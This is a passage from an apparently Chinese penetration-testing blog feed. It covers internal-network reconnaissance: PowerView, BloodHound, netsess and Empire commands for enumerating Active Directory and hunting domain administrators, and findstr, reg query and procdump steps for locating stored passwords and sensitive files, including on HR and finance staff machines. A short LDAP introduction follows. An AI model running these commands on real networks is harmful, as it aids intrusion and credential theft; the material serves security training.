class="comment"># \\computername:    指定要列出登录信息的计算机name</span></span><br><span class="line"><span class="comment"># username:    指定用户名</span></span><br></pre></td></tr></table></figure></p><p>2.PVEFindADUser.exe<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 下载地址： https://github.com/chrisdee/Tools/tree/master/AD/ADFindUsersLoggedOn</span></span><br><span class="line"><span class="comment"># 可用于查找活动目录</span></span><br><span class="line"><span class="comment"># 需要 .net 2.0, 且 需管理员权限</span></span><br><span class="line"></span><br><span class="line">PVEFindADUser.exe  &lt;参数&gt;</span><br><span class="line"><span class="comment"># </span></span><br><span class="line">PVEFindADUser.exe  --current   <span class="comment"># 显示域中所有计算机上当前登录的用户</span></span><br><span class="line">PVEFindADUser.exe  --last   <span class="comment"># 显示域中目标计算机上最后登录的用户</span></span><br><span class="line"><span class="comment"># 参数 -noping 阻止在之前ping</span></span><br></pre></td></tr></table></figure></p><p>4.netsess.exe<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 枚举工具</span></span><br><span class="line"></span><br><span class="line">netsess.exe  &lt;参数&gt;</span><br><span class="line"><span class="comment"># -f file.txt   指定要提取主机列表的文件</span></span><br><span class="line"><span class="comment"># -e file.txt   指定要排除的主机名的文件</span></span><br><span class="line"><span class="comment"># -o file.txt   将所有输出都重定向到指定的文件</span></span><br><span class="line"><span class="comment"># -d domain     指定要提取主机列表的域，若没指定，则从当前域中提取主机列表</span></span><br><span class="line"><span class="comment"># -g group      指定搜索的组名，若没指定，就从当前域中提取主机列表</span></span><br><span class="line"><span class="comment"># -c            对已找到的共享目录/文件的访问权限进行检查</span></span><br></pre></td></tr></table></figure></p><p>5.NetView.exe<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 地址： https://github.com/mubix/netview</span></span><br></pre></td></tr></table></figure></p><p>6.Nmap的NSE脚本<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 下载地址   https://nmap.org/nsedoc/scripts/smb-enum-sessions.html</span></span><br><span class="line">smb-enum-session.nse    <span class="comment"># 获取远程机器的登录会话,查看当前是否有用户登录</span></span><br><span class="line">smb-enum-domains.nse    <span class="comment"># 获取主机信息、用户、可使用密码策略的用户等</span></span><br><span class="line">smb-enum-users.nse      <span class="comment"># 如果获得的权限有限，使用这个获得更多的域用户的信息</span></span><br><span class="line">smb-enum-shares.nse     <span class="comment"># 遍历远程主机的共享目录</span></span><br><span class="line">smb-enum-processs.nse   <span class="comment"># 对主机的系统进程进行遍历（可以知道主机正在运行什么软件）</span></span><br><span class="line">smb-os-discovery.nse    <span class="comment"># 收集目标的一些信息</span></span><br></pre></td></tr></table></figure></p><p>7.PowerShell 中， PowerView脚本： Invoke-UserHunter<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 下载地址： https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerView</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Invoke-StealthUserHunter    只需要进行一次查询，就可以获取域里面的所有用户(隐蔽性高，但不一定全面)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Invoke-UserHunter 找到域内特定的用户群，接收用户名、用户列表和域组查询</span></span><br><span class="line">powershell -nop -<span class="built_in">exec</span> bypass -Command <span class="string">"&amp; &#123;Import-Module .\PowerView.ps1; Invoke-UserHunter&#125;"</span></span><br></pre></td></tr></table></figure></p><p>8.Empire下<code>user_hunter</code>模块<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 也有类似Invoke-UserHunter的模块： user_hunter   --&gt; 用于查找域管理员登录的机器</span></span><br><span class="line">usemodule situational_awareness/network/powerview/user_hunter</span><br></pre></td></tr></table></figure></p><h4 id="查找域管理进程"><a href="#查找域管理进程" class="headerlink" title="查找域管理进程 "></a><font color="red">查找域管理进程 </font></h4><p>如果在无法立即拥有权限的系统中获得管理员进程，那么通常可以采用的方法是：在跳板机之间跳转，直至获得域管理员权限，同时进行一些分析工作，进而找到测试的路径</p><h6 id="a-本机检查"><a href="#a-本机检查" class="headerlink" title="a.本机检查"></a>a.本机检查</h6><p>1．获取域管理员列表<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net group <span class="string">"domain admins"</span> /domain</span><br></pre></td></tr></table></figure></p><p>2．列出本机所有进程及进程用户<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tasklist /v</span><br></pre></td></tr></table></figure></p><p>3．寻找是否有进程所有者为域管理员的进程<br>能用上面两种方法找到自然最好，但实际往往并非如此……</p><h6 id="b-查询域控制器的与用户会话（脚本）"><a href="#b-查询域控制器的与用户会话（脚本）" class="headerlink" title="b.查询域控制器的与用户会话（脚本）"></a>b.查询域控制器的与用户会话（脚本）</h6><ol><li><p>收集域控制器的列表</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 可以使用LDAP查询</span></span><br><span class="line"><span class="comment"># net</span></span><br><span class="line">net group <span class="string">"domain Controllers"</span> /domain</span><br></pre></td></tr></table></figure></li><li><p>收集域管理员的列表</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net group <span class="string">"domain Admins"</span> /domain</span><br></pre></td></tr></table></figure></li><li><p>收集所有活动域会话的列表 </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 使用Netsess.exe插叙每个域控制器，</span></span><br><span class="line">netsess -h</span><br></pre></td></tr></table></figure></li><li><p>将域管理员列表与活动会话列表交叉引用，以确定哪些IP地址具有活动域令牌</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">#也有其他的的GDA脚本(Get Domain Admins)  https://github.com/nullbind/Other-Projects/tree/master/GDA</span></span><br></pre></td></tr></table></figure></li></ol><p>如果没有会话： 隔一段时间，等着有会话 / 脚本自动隔一段时间运行</p><h6 id="c-扫描远程系统上运行的任务"><a href="#c-扫描远程系统上运行的任务" class="headerlink" title="c.扫描远程系统上运行的任务"></a>c.扫描远程系统上运行的任务</h6><p>前提：使用了共享<br><img src="/内网第二章-内网基础信息搜集/20200308144440441_12568.png" alt></p><h6 id="d-扫描远程系统上NetBISO信息"><a href="#d-扫描远程系统上NetBISO信息" class="headerlink" title="d.扫描远程系统上NetBISO信息"></a>d.扫描远程系统上NetBISO信息</h6><p>NetBISO是一个协议，端口137,138,139之类<br>也可使用工具：<code>nbtscan</code><br><img src="/内网第二章-内网基础信息搜集/20200308144903911_31072.png" alt></p><h4 id="模拟域管理员的方法"><a href="#模拟域管理员的方法" class="headerlink" title=" 模拟域管理员的方法"></a><font color="red"> 模拟域管理员的方法</font></h4><p>如果已经拥有了meterpreter会话，就可以使用<code>Incognito</code>来模拟域管理者添加一个域管理员，通过尝试遍历系统中所有可用的授权令牌来添加新的管理员<br>第四章见</p><h4 id="利用-PowerShell-收集域信息"><a href="#利用-PowerShell-收集域信息" class="headerlink" title=" 利用 PowerShell 收集域信息"></a><font color="red"> 利用 PowerShell 收集域信息</font></h4><h6 id="PowerShell"><a href="#PowerShell" class="headerlink" title="PowerShell"></a>PowerShell</h6><p>PowerShell常用的执行权限共有四种，具体如下。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Restricted：默认设置，不允许执行任何脚本。</span><br><span class="line">Allsigned：只能运行经过证书验证的脚本。</span><br><span class="line">Unrestricted：权限最高，可以执行任意脚本。</span><br><span class="line">RemoteSigned：本地脚本无限制，但是对来自网络的脚本必须经过签名。</span><br><span class="line"></span><br><span class="line">在 PowerShell 中输入“Get-ExecutionPolicy”，看到为默认 Restricted 权限</span><br></pre></td></tr></table></figure></p><h6 id="PowerView"><a href="#PowerView" class="headerlink" title="PowerView"></a>PowerView</h6><blockquote><p>是一款依赖 PowerShell 和 WMI 对内网域情况进行查询的常用渗透脚本，PowerView 集成在<code>PowerSploit</code> 工具包中<br><a href="https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1" target="_blank" rel="noopener">下载地址</a></p></blockquote><p>BypassUAC 最直接的办法： <code>-ExexutionPolicy ByPass</code></p><p><strong>PowerView 中的常用命令</strong><br><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 先 Import-Moudle .\PowerView.ps1</span></span><br><span class="line"></span><br><span class="line">Get-NetDomain    <span class="comment">#获取当前用户所在的域名称</span></span><br><span class="line">Get-NetUser    <span class="comment">#返回所有用户的详细信息</span></span><br><span class="line">Get-NetDomainController    <span class="comment">#获取所有域控制器</span></span><br><span class="line">Get-NetComputer    <span class="comment">#获取所有域内机器的详细信息</span></span><br><span class="line">Get-NetOU    <span class="comment">#获取域中的 OU 信息</span></span><br><span class="line">Get-NetGroup    <span class="comment">#获取所有域内组和组成员信息</span></span><br><span class="line">Get-NetFileServer    <span class="comment">#根据 SPN 获取当前域使用的文件服务器</span></span><br><span class="line">Get-NetShare   <span class="comment">#获取当前域内所有网络共享</span></span><br><span class="line">Get-NetSession    <span class="comment">#获取在指定服务器存在的会话信息</span></span><br><span class="line">Get-NetRDPSession   <span class="comment"># 获取在指定服务器存在的远程连接信息</span></span><br><span class="line">Get-NetProcess    <span class="comment">#获取远程主机的进程信息</span></span><br><span class="line">Get-UserEvent    <span class="comment">#获取指定用户的日志信息</span></span><br><span class="line">Get-ADObject    <span class="comment">#获取活动目录的对象信息</span></span><br><span class="line">Get-NetGPO    <span class="comment">#获取域所有组策略对象</span></span><br><span class="line">Get-DomainPolicy   <span class="comment"># 获取域默认或域控制器策略</span></span><br><span class="line">Invoke-UserHunter    <span class="comment">#用于获取域用户登录计算机及该用户是否有本地管理权限</span></span><br><span class="line">Invoke-ProcessHunter    <span class="comment">#查找域内所有机器进程用于找到某特定用户</span></span><br><span class="line">Invoke-UserEventHunter    <span class="comment">#根据用户日志获取某域用户登录过哪些域机器</span></span><br></pre></td></tr></table></figure></p><h4 id="域分析工具-BloodHound"><a href="#域分析工具-BloodHound" class="headerlink" title=" 域分析工具 BloodHound "></a><font color="red"> 域分析工具 BloodHound </font></h4><p>通过图与线的方式，把域内信息直观的展示</p><p><a href="https://github.com/BloodHoundAD/BloodHound/releases/download/2.0.4/BloodHound-win32-x64.zip" target="_blank" rel="noopener">https://github.com/BloodHoundAD/BloodHound/releases/download/2.0.4/BloodHound-win32-x64.zip</a></p><h6 id="配置环境"><a href="#配置环境" class="headerlink" title="配置环境"></a>配置环境</h6><p>1.下载安装jdk并配置<br>2.下载安装Neo4j（Neo4j Server -&gt; Community Server-&gt;Windows）<br>3.启动Neo4j数据库服务端(neo4j-&gt;非关系型数据库.   进入解压后的bin，输入命令<code>ndo4j.bat console</code>启动服务)<br>4.浏览器输入：127.0.0.1:7474/browser，用户名密码默认<code>neo4j</code><br>4.下载BloodHound, 解压后双击exe启动， 输入<code>bolt://localhost:7687</code>和账户密码，就安装好了</p><h6 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h6><p>主界面按钮和选项描述：<br>……</p><p><strong>采集数据</strong></p><ul><li>哪些用户登录了哪些机器</li><li>哪些用户拥有管理员权限</li><li>那些用户和组属于哪些组</li></ul><p>BloodHound采集需依赖PowerView.ps1的BloodHound：<br>BloodHound分为两部分：<br>            1.PowerShell采集器脚本(<a href="https://github.com/BloodHoundAD/BloodHound/blob/master/Ingestors/SharpHound.ps1" target="_blank" rel="noopener">SharpHound.ps1</a>)<br>            2.可执行文件SharpHound.exe</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 使用SharpHound.exe采集域内信息</span></span><br><span class="line">把SharpHound.exe复制到目标机器</span><br><span class="line">sh.exe -c all</span><br></pre></td></tr></table></figure><p><strong>导入数据</strong><br>在当前目录下，会生成<code></code>xxx_BloodHound.zip`压缩包<br>可以把压缩文件放到界面上节点信息以外的任意位置</p><p><strong>查询信息</strong><br>主界面左上角的查询<code>Queries</code>, 进入模块，可以看到预定义的常用查询条件<br><img src="/内网第二章-内网基础信息搜集/20200507194413982_1350438555.png" alt></p><p>按住<code>ctrl</code>键，可以循环显示； 在其图标上按住鼠标左键可以移动位置</p><h4 id="敏感数据的防护"><a href="#敏感数据的防护" class="headerlink" title=" 敏感数据的防护 "></a><font color="red"> 敏感数据的防护 </font></h4><blockquote><p>价值比较高的东西基本上是全部在内网的</p></blockquote><h6 id="资料-数据-文件的定位流程"><a href="#资料-数据-文件的定位流程" class="headerlink" title="资料/数据/文件的定位流程"></a>资料/数据/文件的定位流程</h6><ol><li>定位内部人事组织结构。</li><li>在内部人事组织中寻找需要监视的相关人员。</li><li>定位相关人员的机器。</li><li>监视相关人工作时存放文档的位置。</li><li>列出存放文档服务器的目录。</li></ol><h6 id="定位内部人事组织结构"><a href="#定位内部人事组织结构" class="headerlink" title="定位内部人事组织结构"></a>定位内部人事组织结构</h6><p><strong>1. 人事组织结构图</strong><br>类似公司结构图可以在目标的外部站点(类如首页<code>“关于我们”</code> )和网上暴露的<br>信息(类如发表在<code>招聘网的各类岗位名称</code>)来分析,或者在<code>内网电脑中寻找</code>类似的人<br>事组织结构图, 再<code>结合分析人事资料里相关员工资料与域内用户名或者用户组的对应关系</code>, 可以很快定位到你需要寻找的人员使用的机器</p><p><strong>2. 人力资源主管个人电脑</strong><br>在内网中通过上述种种方法定位到人力资源主管个人机器,通常单位人力资源主<br>管电脑中会存在公司所有人员的身份信息及相关材料,寻找到人力资源主管个人机器<br>后在其电脑中寻找公司人力资源相关文档得存放位置,然后从人力资源文档中寻找公<br>司相关人员信息,直至收集到你所需要的材料。</p><ol start="3"><li><code>net group /domain</code><br>可以查询域内所有用户组的信息, 同样可以利用该命令来定位公司内部人事结构<br><img src="/内网第二章-内网基础信息搜集/20200506224521447_1788866667.png" alt><br>除了内置重点组外, <code>自建的域组</code>需要特别关注<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">(1)IT组/研发组: 他们掌握了大量的内网密码,数据库密码等。</span><br><span class="line">(2)秘书组: 他们掌握着大量的目标机构的内部传达文件和资料,为信息分析业务提供信息。</span><br><span class="line">(3)财务组: 他们掌握着目标机构大量的资金往来与目标企业的规划发展,并且可以通过资金表,来判断出目标组织的整体架构。</span><br><span class="line">(4)CXX组: 如ceo cto coo等,不同的组织名字不同,如部长、厂长、经理等,会拥有目标机构的机密信息</span><br></pre></td></tr></table></figure></li></ol><h6 id="重点核心业务机器及敏感信息防护"><a href="#重点核心业务机器及敏感信息防护" class="headerlink" title="重点核心业务机器及敏感信息防护"></a>重点核心业务机器及敏感信息防护</h6><blockquote><p>重点核心业务机器是渗透测试人员通常比较关心的机器,因此需要做好相应的防护措施。</p></blockquote><p><strong>1.核心业务机器</strong><br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">- 高管/系统管理员/财务/人事/业务人员的个人计算机。</span><br><span class="line">- 产品管理系统服务器(仓库管理系统)</span><br><span class="line">- OA 办公系统服务器。</span><br><span class="line">- 财务应用系统服务器。</span><br><span class="line">- 核心产品源码服务器(对于 IT 公司,会架设自己的 SVN 或者 GIT 服务器)</span><br><span class="line">- 数据库服务器。</span><br><span class="line">- 文件服务器/共享服务器。</span><br><span class="line">- 邮件服务器。</span><br><span class="line">- 网络监控系统服务器。</span><br><span class="line">- 其他服务器(分公司、工厂)</span><br></pre></td></tr></table></figure></p><p><strong>2.各类敏感文件信息</strong><br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">- 站点源码备份文件、数据库备份文件、配置文件备份等(后缀 XX.zip,XX.sql 等)</span><br><span class="line">- 各类数据库的 Web 管理入口,如 phpmyadmin、adminer 等。</span><br><span class="line">- 浏览器密码和浏览器 cookie(IE、Chrome、Firefox)</span><br><span class="line">- 其他用户会话、3389 和 ipc$连接记录、各用户回收站的信息等。</span><br><span class="line">- Windows 无线密码。</span><br><span class="line">- 目标内部的各种账号和密码信息,包括邮箱、VPN、FTP、TeamView 等。</span><br></pre></td></tr></table></figure></p><h6 id="应用与文件形式的信息收集"><a href="#应用与文件形式的信息收集" class="headerlink" title="应用与文件形式的信息收集"></a>应用与文件形式的信息收集</h6><p>说白了就是翻文件（包括一些应用的配置文件、敏感文件、密码、远程连接、员工账号、电子邮箱等）</p><p>不管什么途径获得的内网机器,首先需要知道的就是这台机器所属人员的职位、权利,通常一个高权利的人他在内网的权限比一般员工要高很多,他的电脑内也会有很多重要的、敏感的个人或公司内部文件。</p><p>用户在内网中工作时,建议不要将一些特别重要的资料放在公开的计算机中,必要时一定要对 Office 文档进行加密,密码也不要太过于简单</p><p><strong>常用搜索：</strong><br>1.搜索指定含有任意多关键字的文件名<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">dir c:\*.doc /s</span><br><span class="line">dir /b/s password.txt</span><br><span class="line">dir /b/s config.*dir /s *pass* == *cred* == *vnc* ==*.config*</span><br></pre></td></tr></table></figure></p><p>2.搜索文件名为password.txt/xml/ini的文件,这个操作可能造成大量的输出<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">findstr /si password *.xml *.ini *.txt</span><br></pre></td></tr></table></figure></p><p>3.搜索带有关键词的注册表项,下例中是查询的关键词是 “password”的命令<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">reg query HKLM /f password /t REG_SZ /s</span><br><span class="line">reg query HKCU /f password /t REG_SZ /s</span><br></pre></td></tr></table></figure></p><p>4.对于加密office办公软件<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">如果是低版本如2003的话,可以在百度搜一些网上的破解软件进行破解。</span><br><span class="line"></span><br><span class="line">如果是高版本的话,可以在目标用户打开文件时使用微软SysinternalsSuite套装中</span><br><span class="line">的抓取dump的工具-procdump来抓取内存dump,然后用内存查看器直接查看文件内容。</span><br></pre></td></tr></table></figure></p><h4 id="分析域内网段划分情况及拓扑结构"><a href="#分析域内网段划分情况及拓扑结构" class="headerlink" title=" 分析域内网段划分情况及拓扑结构 "></a><font color="red"> 分析域内网段划分情况及拓扑结构 </font></h4><h6 id="目标主机基本架构的判断"><a href="#目标主机基本架构的判断" class="headerlink" title="目标主机基本架构的判断"></a>目标主机基本架构的判断</h6><p>常见的 Web 架构：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">- ASP + Access + IIS 5.0/6.0 + Windows Sever 2003</span><br><span class="line">- ASPX + MSSQL + IIS 7.0/7.5 + Windows Sever 2008</span><br><span class="line">- PHP + MySQL + IIS</span><br><span class="line">- PHP + MySQL + Apache</span><br><span class="line">- PHP + MySQL + Ngnix</span><br><span class="line">- JSP + MySQL + Ngnix</span><br><span class="line">- JSP + MSSQL + Tomcat</span><br><span class="line">- JSP + Oracle + Tomcat</span><br></pre></td></tr></table></figure></p><h6 id="域内网段划分信息"><a href="#域内网段划分信息" class="headerlink" title="域内网段划分信息"></a>域内网段划分信息</h6><p>内网的环境判断,首先需要分析下内网IP分布情况,一般可以通过内网中路由器、交换机等设备、snmp、弱口令等来获取内网网络拓扑或DNS域传送信息泄漏,另外一般大公司都会有内部网站,也可通过内部网站公开内容链接找出部门ip段。</p><p>分析出内部网络是怎么划分的?是按照部门划分的网络段?还是按照楼层?还是<br>按照地区?通常内网可分为DMZ区、办公区和核心区(生产区),了解整个内网的网<br>络分布和组成,也有助于我们寻找内网核心业务。</p><p>1.DMZ 区<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">在实际的渗透测试中,大多数情况下,在外围 Web 中拿到的权限在 DMZ 区。这个区域不属</span><br><span class="line">于严格意义上的内网。如果 DMZ 区域访问控制策略配置合理,DMZ 区会处在内网区能够访问</span><br><span class="line">DMZ 区而 DMZ 区访问不了内网区的情况下,相关知识在第 1 章中已经详细讲解过,此处不再重</span><br><span class="line">复。</span><br></pre></td></tr></table></figure></p><p>2.办公区<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">办公区,顾名思义,是指公司员工日常的工作区。办公区的安全防护水平一般不是高,基本</span><br><span class="line">防护机制大多为杀毒软件或主机入侵检测产品。在实际应用中,攻击者在获取权限后,利用内网</span><br><span class="line">信任关系,很容易扩大攻击面。一般情况下,攻击者很少会直接到达办公区。攻击者如果想进入</span><br><span class="line">办公区,可能会使用鱼叉攻击、水坑攻击或者社会工程学等手段。</span><br><span class="line"></span><br><span class="line">办公区按照系统可分为： OA 系统、邮件系统、财务系统、文件共享系统、域控、企业版杀毒</span><br><span class="line">系统、内部应用监控系统、运维管理系统等,按照网络段可分为域管理网段、内部服务器系统网</span><br><span class="line">段、各部门分区网段等。</span><br><span class="line">按照网络段可分为:域管理网段、内部服务器系统网段、各部门分区网段等。</span><br></pre></td></tr></table></figure></p><p>3.核心区<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">核心区一般存放企业最重要的数据、文档等信息资产,如域控制器、核心生产机器等,安全</span><br><span class="line">设置也最为严格。根据目标开展的业务不同,相关服务器可能存在于不同的网段上。通过分析服</span><br><span class="line">务器上运行的服务和进程,可以推断出目标主机使用的运维监控管理系统和安全防护系。在内网</span><br><span class="line">中横向移动时,会优先查找这些主机。</span><br><span class="line"></span><br><span class="line">核心区按照系统可分为业务系统、运维监控系</span><br><span class="line">按照网络段可分为:各不同的业务网段、运维监控网段、安全管理网段等。</span><br></pre></td></tr></table></figure></p><h6 id="多层域结构分析"><a href="#多层域结构分析" class="headerlink" title="多层域结构分析"></a>多层域结构分析</h6><p>我们需要先分析出当前内网是否存在多层域、现在这计算机所在的域是几级子域、这个子域的域控制器及根域的域控制器是哪些、其他域的域控制器是哪些、域之间是否存在域信任关系等。</p><h6 id="绘制内网拓扑图"><a href="#绘制内网拓扑图" class="headerlink" title="绘制内网拓扑图"></a>绘制内网拓扑图</h6><hr><h6 id="基础信息搜集-思维图"><a href="#基础信息搜集-思维图" class="headerlink" title="基础信息搜集- 思维图"></a>基础信息搜集- 思维图</h6><p><img src="/内网第二章-内网基础信息搜集/内网信息搜集-思维图.Jpeg" alt></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;二-内网信息收集&quot;&gt;&lt;a href=&quot;#二-内网信息收集&quot; class=&quot;headerlink&quot; title=&quot;二 . 内网信息收集&quot;&gt;&lt;/a&gt;二 . 内网信息收集&lt;/h1&gt;&lt;h4 id=&quot;本机信息收集&quot;&gt;&lt;a href=&quot;#本机信息收集&quot; class=&quot;head
      
    
    </summary>
    
      <category term="渗透测试" scheme="http://www.xpshuai.cn/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
      <category term="渗透测试" scheme="http://www.xpshuai.cn/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
      <category term="内网" scheme="http://www.xpshuai.cn/tags/%E5%86%85%E7%BD%91/"/>
    
      <category term="信息搜集" scheme="http://www.xpshuai.cn/tags/%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/"/>
    
  </entry>
  
  <entry>
    <title>ubuntu server-LDAP</title>
    <link href="http://www.xpshuai.cn/ubuntu-server-LDAP/"/>
    <id>http://www.xpshuai.cn/ubuntu-server-LDAP/</id>
    <published>2020-05-07T08:23:59.000Z</published>
    <updated>2020-05-07T08:31:28.497Z</updated>
    
    <content type="html"><![CDATA[<h1 id="LDAP"><a href="#LDAP" class="headerlink" title="LDAP"></a>LDAP</h1><blockquote><p>看书前先看目录</p></blockquote><h4 id="理解"><a href="#理解" class="headerlink" title="理解"></a>理解</h4><p>不同于文件系统的目录(D/d) -&gt; 首字母大写是目录服务，首字母小写的文件系统目录</p><p>目录服务是企业网络的核心基础结构<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">- 如此重要的服务并不被大多数熟悉</span><br><span class="line">- 很少独立使用，与其他服务结合使用</span><br><span class="line">- 微软的企业战略（埋坑: 一旦底层用了微软的AD,你以后的一些肯定也要用我的集成的产品）</span><br><span class="line">- 类似: 每一本书都有自己的目录</span><br></pre></td></tr></table></figure></p><p>数据集中存储的应用需求<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">- 集中存储、集中管理、集中定位</span><br><span class="line">- 身份认证、公钥分发、邮件路由、地址查询、应用配置、单点登录(SSO -&gt; 只登录一次就不用重复登录了)</span><br><span class="line">- 面向大量频繁的数据查询操作，少量写操作（基本不变的数据）</span><br><span class="line">- 权限限制授权用户查询</span><br></pre></td></tr></table></figure></p><p>我是否应该使用目录服务(根据自己公司情况)<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">- 用户认证</span><br><span class="line">- 机器认证</span><br><span class="line">- 用户和组</span><br><span class="line">- 电话地址薄</span><br><span class="line">- 组织呈现</span><br><span class="line">- 资产跟踪</span><br><span class="line">- 集中应用配置</span><br><span class="line">- PEX / 网络设备配置</span><br></pre></td></tr></table></figure></p><h4 id="DAP"><a href="#DAP" class="headerlink" title="DAP"></a>DAP</h4><p><strong>软件架构</strong></p><ul><li>不同与SQL的后端层级化数据库（<code>主要面向查询操作</code>）</li><li>与DNS的分布式结构更接近，命名上通常与DBS命名保持一致(在目录服务内所有存储对象都有唯一的路径名称)</li><li>数据库基于键值对的方式存储数据</li><li>标准统一的服务前端应用查询访问接口(基于OSI协议栈,  X.500)</li><li>统一的客户端查询组件和协议(C/S)</li><li>支持通信会话加密</li><li>Directory information tree (DIT)</li></ul><p><strong>与自建数据库开发相比</strong></p><ul><li>专门针对查询服务的数据库结构类型</li><li>统一标准的查询结构以及通信协议（DAP -&gt;目录访问协议）</li></ul><h4 id="LDAP-1"><a href="#LDAP-1" class="headerlink" title="LDAP"></a>LDAP</h4><blockquote><p>Lightweight Directoy Access Protocol    